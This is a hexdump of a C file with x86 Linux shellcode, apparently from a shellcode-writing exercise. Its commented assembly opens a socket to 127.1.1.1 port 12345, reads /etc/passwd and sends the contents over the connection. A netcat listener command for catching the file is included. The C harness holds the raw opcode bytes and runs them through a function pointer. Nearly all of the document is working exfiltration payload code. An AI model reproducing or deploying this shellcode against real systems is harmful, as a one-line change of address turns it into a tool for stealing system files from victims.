00000000  2f 2a 0a 3b 20 41 75 74  68 6f 72 3a 20 44 61 6e  |/*.; Author: Dan|
00000010  69 65 6c 20 53 61 75 64  65 72 0a 3b 20 57 65 62  |iel Sauder.; Web|
00000020  73 69 74 65 3a 20 68 74  74 70 3a 2f 2f 67 6f 76  |site: http://gov|
00000030  6f 6c 75 74 69 6f 6e 2e  77 6f 72 64 70 72 65 73  |olution.wordpres|
00000040  73 2e 63 6f 6d 2f 61 62  6f 75 74 0a 3b 20 4c 69  |s.com/about.; Li|
00000050  63 65 6e 73 65 20 68 74  74 70 3a 2f 2f 63 72 65  |cense http://cre|
00000060  61 74 69 76 65 63 6f 6d  6d 6f 6e 73 2e 6f 72 67  |ativecommons.org|
00000070  2f 6c 69 63 65 6e 73 65  73 2f 62 79 2d 73 61 2f  |/licenses/by-sa/|
00000080  33 2e 30 2f 0a 0a 3b 20  53 68 65 6c 6c 63 6f 64  |3.0/..; Shellcod|
00000090  65 20 72 65 61 64 73 20  2f 65 74 63 2f 70 61 73  |e reads /etc/pas|
000000a0  73 77 64 20 61 6e 64 20  73 65 6e 64 73 20 74 68  |swd and sends th|
000000b0  65 20 63 6f 6e 74 65 6e  74 20 74 6f 20 31 32 37  |e content to 127|
000000c0  2e 31 2e 31 2e 31 20 70  6f 72 74 20 31 32 33 34  |.1.1.1 port 1234|
000000d0  35 2e 20 0a 3b 20 54 68  65 20 66 69 6c 65 20 63  |5. .; The file c|
000000e0  61 6e 20 62 65 20 72 65  63 69 65 76 65 64 20 75  |an be recieved u|
000000f0  73 69 6e 67 20 6e 65 74  63 61 74 3a 0a 3b 20 24  |sing netcat:.; $|
00000100  20 6e 63 20 2d 6c 20 31  32 37 2e 31 2e 31 2e 31  | nc -l 127.1.1.1|
00000110  20 31 32 33 34 35 0a 0a  73 65 63 74 69 6f 6e 20  | 12345..section |
00000120  2e 74 65 78 74 0a 0a 67  6c 6f 62 61 6c 20 5f 73  |.text..global _s|
00000130  74 61 72 74 0a 0a 5f 73  74 61 72 74 3a 0a 20 20  |tart.._start:.  |
00000140  20 20 3b 20 73 6f 63 6b  65 74 0a 20 20 20 20 70  |  ; socket.    p|
00000150  75 73 68 20 42 59 54 45  20 30 78 36 36 20 20 20  |ush BYTE 0x66   |
00000160  20 3b 20 73 6f 63 6b 65  74 63 61 6c 6c 20 31 30  | ; socketcall 10|
00000170  32 0a 20 20 20 20 70 6f  70 20 65 61 78 0a 20 20  |2.    pop eax.  |
00000180  20 20 78 6f 72 20 65 62  78 2c 20 65 62 78 20 0a  |  xor ebx, ebx .|
00000190  20 20 20 20 69 6e 63 20  65 62 78 20 0a 20 20 20  |    inc ebx .   |
000001a0  20 78 6f 72 20 65 64 78  2c 20 65 64 78 0a 20 20  | xor edx, edx.  |
000001b0  20 20 70 75 73 68 20 65  64 78 20 0a 20 20 20 20  |  push edx .    |
000001c0  70 75 73 68 20 42 59 54  45 20 30 78 31 0a 20 20  |push BYTE 0x1.  |
000001d0  20 20 70 75 73 68 20 42  59 54 45 20 30 78 32 0a  |  push BYTE 0x2.|
000001e0  20 20 20 20 6d 6f 76 20  65 63 78 2c 20 65 73 70  |    mov ecx, esp|
000001f0  0a 20 20 20 20 69 6e 74  20 30 78 38 30 0a 20 20  |.    int 0x80.  |
00000200  20 20 6d 6f 76 20 65 73  69 2c 20 65 61 78 0a 0a  |  mov esi, eax..|
00000210  20 20 20 20 3b 20 63 6f  6e 6e 65 63 74 0a 20 20  |    ; connect.  |
00000220  20 20 70 75 73 68 20 42  59 54 45 20 30 78 36 36  |  push BYTE 0x66|
00000230  20 0a 20 20 20 20 70 6f  70 20 65 61 78 0a 20 20  | .    pop eax.  |
00000240  20 20 69 6e 63 20 65 62  78 0a 20 20 20 20 70 75  |  inc ebx.    pu|
00000250  73 68 20 44 57 4f 52 44  20 30 78 30 31 30 31 30  |sh DWORD 0x01010|
00000260  31 37 66 20 20 3b 31 32  37 2e 31 2e 31 2e 31 0a  |17f  ;127.1.1.1.|
00000270  20 20 20 20 70 75 73 68  20 57 4f 52 44 20 30 78  |    push WORD 0x|
00000280  33 39 33 30 20 20 3b 20  50 6f 72 74 20 31 32 33  |3930  ; Port 123|
00000290  34 35 0a 20 20 20 20 70  75 73 68 20 57 4f 52 44  |45.    push WORD|
000002a0  20 62 78 0a 20 20 20 20  6d 6f 76 20 65 63 78 2c  | bx.    mov ecx,|
000002b0  20 65 73 70 0a 20 20 20  20 70 75 73 68 20 42 59  | esp.    push BY|
000002c0  54 45 20 31 36 0a 20 20  20 20 70 75 73 68 20 65  |TE 16.    push e|
000002d0  63 78 0a 20 20 20 20 70  75 73 68 20 65 73 69 0a  |cx.    push esi.|
000002e0  20 20 20 20 6d 6f 76 20  65 63 78 2c 20 65 73 70  |    mov ecx, esp|
000002f0  0a 20 20 20 20 69 6e 63  20 65 62 78 0a 20 20 20  |.    inc ebx.   |
00000300  20 69 6e 74 20 30 78 38  30 0a 0a 20 20 20 20 3b  | int 0x80..    ;|
00000310  20 64 75 70 32 0a 20 20  20 20 6d 6f 76 20 65 73  | dup2.    mov es|
00000320  69 2c 20 65 61 78 0a 20  20 20 20 70 75 73 68 20  |i, eax.    push |
00000330  42 59 54 45 20 30 78 31  0a 20 20 20 20 70 6f 70  |BYTE 0x1.    pop|
00000340  20 65 63 78 0a 20 20 20  20 6d 6f 76 20 42 59 54  | ecx.    mov BYT|
00000350  45 20 61 6c 2c 20 30 78  33 46 0a 20 20 20 20 69  |E al, 0x3F.    i|
00000360  6e 74 20 30 78 38 30 0a  20 20 20 20 0a 20 20 20  |nt 0x80.    .   |
00000370  20 3b 72 65 61 64 20 74  68 65 20 66 69 6c 65 0a  | ;read the file.|
00000380  20 20 20 20 6a 6d 70 20  73 68 6f 72 74 20 63 61  |    jmp short ca|
00000390  6c 6c 5f 73 68 65 6c 6c  63 6f 64 65 0a 20 20 20  |ll_shellcode.   |
000003a0  20 0a 73 68 65 6c 6c 63  6f 64 65 3a 0a 20 20 20  | .shellcode:.   |
000003b0  20 70 75 73 68 20 30 78  35 0a 20 20 20 20 70 6f  | push 0x5.    po|
000003c0  70 20 65 61 78 0a 20 20  20 20 70 6f 70 20 65 62  |p eax.    pop eb|
000003d0  78 0a 20 20 20 20 78 6f  72 20 65 63 78 2c 65 63  |x.    xor ecx,ec|
000003e0  78 0a 20 20 20 20 69 6e  74 20 30 78 38 30 0a 20  |x.    int 0x80. |
000003f0  20 20 20 6d 6f 76 20 65  62 78 2c 65 61 78 0a 20  |   mov ebx,eax. |
00000400  20 20 20 6d 6f 76 20 61  6c 2c 30 78 33 0a 20 20  |   mov al,0x3.  |
00000410  20 20 6d 6f 76 20 65 64  69 2c 65 73 70 0a 20 20  |  mov edi,esp.  |
00000420  20 20 6d 6f 76 20 65 63  78 2c 65 64 69 0a 20 20  |  mov ecx,edi.  |
00000430  20 20 78 6f 72 20 65 64  78 2c 65 64 78 0a 20 20  |  xor edx,edx.  |
00000440  20 20 6d 6f 76 20 64 68  2c 30 78 66 66 0a 20 20  |  mov dh,0xff.  |
00000450  20 20 6d 6f 76 20 64 6c  2c 30 78 66 66 0a 20 20  |  mov dl,0xff.  |
00000460  20 20 69 6e 74 20 30 78  38 30 0a 20 20 20 20 6d  |  int 0x80.    m|
00000470  6f 76 20 65 64 78 2c 65  61 78 0a 20 20 20 20 70  |ov edx,eax.    p|
00000480  75 73 68 20 30 78 34 0a  20 20 20 20 70 6f 70 20  |ush 0x4.    pop |
00000490  65 61 78 0a 20 20 20 20  6d 6f 76 20 62 6c 2c 20  |eax.    mov bl, |
000004a0  30 78 31 0a 20 20 20 20  69 6e 74 20 30 78 38 30  |0x1.    int 0x80|
000004b0  0a 20 20 20 20 70 75 73  68 20 30 78 31 0a 20 20  |.    push 0x1.  |
000004c0  20 20 70 6f 70 20 65 61  78 0a 20 20 20 20 69 6e  |  pop eax.    in|
000004d0  63 20 65 62 78 0a 20 20  20 20 69 6e 74 20 30 78  |c ebx.    int 0x|
000004e0  38 30 0a 20 20 20 20 0a  63 61 6c 6c 5f 73 68 65  |80.    .call_she|
000004f0  6c 6c 63 6f 64 65 3a 0a  20 20 20 20 63 61 6c 6c  |llcode:.    call|
00000500  20 73 68 65 6c 6c 63 6f  64 65 0a 20 20 20 20 6d  | shellcode.    m|
00000510  65 73 73 61 67 65 20 64  62 20 22 2f 65 74 63 2f  |essage db "/etc/|
00000520  70 61 73 73 77 64 22 0a  20 20 20 20 0a 2a 2f 0a  |passwd".    .*/.|
00000530  0a 23 69 6e 63 6c 75 64  65 20 3c 73 74 64 69 6f  |.#include <stdio|
00000540  2e 68 3e 0a 23 69 6e 63  6c 75 64 65 20 3c 73 74  |.h>.#include <st|
00000550  72 69 6e 67 2e 68 3e 0a  0a 75 6e 73 69 67 6e 65  |ring.h>..unsigne|
00000560  64 20 63 68 61 72 20 63  6f 64 65 5b 5d 20 3d 20  |d char code[] = |
00000570  5c 0a 22 5c 78 36 61 5c  78 36 36 5c 78 35 38 5c  |\."\x6a\x66\x58\|
00000580  78 33 31 5c 78 64 62 5c  78 34 33 5c 78 33 31 5c  |x31\xdb\x43\x31\|
00000590  78 64 32 5c 78 35 32 5c  78 36 61 5c 78 30 31 5c  |xd2\x52\x6a\x01\|
000005a0  78 36 61 5c 78 30 32 5c  78 38 39 5c 78 65 31 5c  |x6a\x02\x89\xe1\|
000005b0  78 63 64 5c 78 38 30 5c  78 38 39 5c 78 63 36 5c  |xcd\x80\x89\xc6\|
000005c0  78 36 61 5c 78 36 36 5c  78 35 38 5c 78 34 33 5c  |x6a\x66\x58\x43\|
000005d0  78 36 38 5c 78 37 66 5c  78 30 31 5c 78 30 31 5c  |x68\x7f\x01\x01\|
000005e0  78 30 31 5c 78 36 36 5c  78 36 38 5c 78 33 30 5c  |x01\x66\x68\x30\|
000005f0  78 33 39 5c 78 36 36 5c  78 35 33 5c 78 38 39 5c  |x39\x66\x53\x89\|
00000600  78 65 31 5c 78 36 61 5c  78 31 30 5c 78 35 31 5c  |xe1\x6a\x10\x51\|
00000610  78 35 36 5c 78 38 39 5c  78 65 31 5c 78 34 33 5c  |x56\x89\xe1\x43\|
00000620  78 63 64 5c 78 38 30 5c  78 38 39 5c 78 63 36 5c  |xcd\x80\x89\xc6\|
00000630  78 36 61 5c 78 30 31 5c  78 35 39 5c 78 62 30 5c  |x6a\x01\x59\xb0\|
00000640  78 33 66 5c 78 63 64 5c  78 38 30 5c 78 65 62 5c  |x3f\xcd\x80\xeb\|
00000650  78 32 37 5c 78 36 61 5c  78 30 35 5c 78 35 38 5c  |x27\x6a\x05\x58\|
00000660  78 35 62 5c 78 33 31 5c  78 63 39 5c 78 63 64 5c  |x5b\x31\xc9\xcd\|
00000670  78 38 30 5c 78 38 39 5c  78 63 33 5c 78 62 30 5c  |x80\x89\xc3\xb0\|
00000680  78 30 33 5c 78 38 39 5c  78 65 37 5c 78 38 39 5c  |x03\x89\xe7\x89\|
00000690  78 66 39 5c 78 33 31 5c  78 64 32 5c 78 62 36 5c  |xf9\x31\xd2\xb6\|
000006a0  78 66 66 5c 78 62 32 5c  78 66 66 5c 78 63 64 5c  |xff\xb2\xff\xcd\|
000006b0  78 38 30 5c 78 38 39 5c  78 63 32 5c 78 36 61 5c  |x80\x89\xc2\x6a\|
000006c0  78 30 34 5c 78 35 38 5c  78 62 33 5c 78 30 31 5c  |x04\x58\xb3\x01\|
000006d0  78 63 64 5c 78 38 30 5c  78 36 61 5c 78 30 31 5c  |xcd\x80\x6a\x01\|
000006e0  78 35 38 5c 78 34 33 5c  78 63 64 5c 78 38 30 5c  |x58\x43\xcd\x80\|
000006f0  78 65 38 5c 78 64 34 5c  78 66 66 5c 78 66 66 5c  |xe8\xd4\xff\xff\|
00000700  78 66 66 5c 78 32 66 5c  78 36 35 5c 78 37 34 5c  |xff\x2f\x65\x74\|
00000710  78 36 33 5c 78 32 66 5c  78 37 30 5c 78 36 31 5c  |x63\x2f\x70\x61\|
00000720  78 37 33 5c 78 37 33 5c  78 37 37 5c 78 36 34 22  |x73\x73\x77\x64"|
00000730  3b 0a 0a 6d 61 69 6e 28  29 0a 7b 0a 0a 20 20 20  |;..main().{..   |
00000740  20 70 72 69 6e 74 66 28  22 53 68 65 6c 6c 63 6f  | printf("Shellco|
00000750  64 65 20 4c 65 6e 67 74  68 3a 20 20 25 64 5c 6e  |de Length:  %d\n|
00000760  22 2c 20 73 74 72 6c 65  6e 28 63 6f 64 65 29 29  |", strlen(code))|
00000770  3b 0a 0a 20 20 20 20 69  6e 74 20 28 2a 72 65 74  |;..    int (*ret|
00000780  29 28 29 20 3d 20 28 69  6e 74 28 2a 29 28 29 29  |)() = (int(*)())|
00000790  63 6f 64 65 3b 0a 0a 20  20 20 20 72 65 74 28 29  |code;..    ret()|
000007a0  3b 0a 0a 7d                                       |;..}|
000007a4
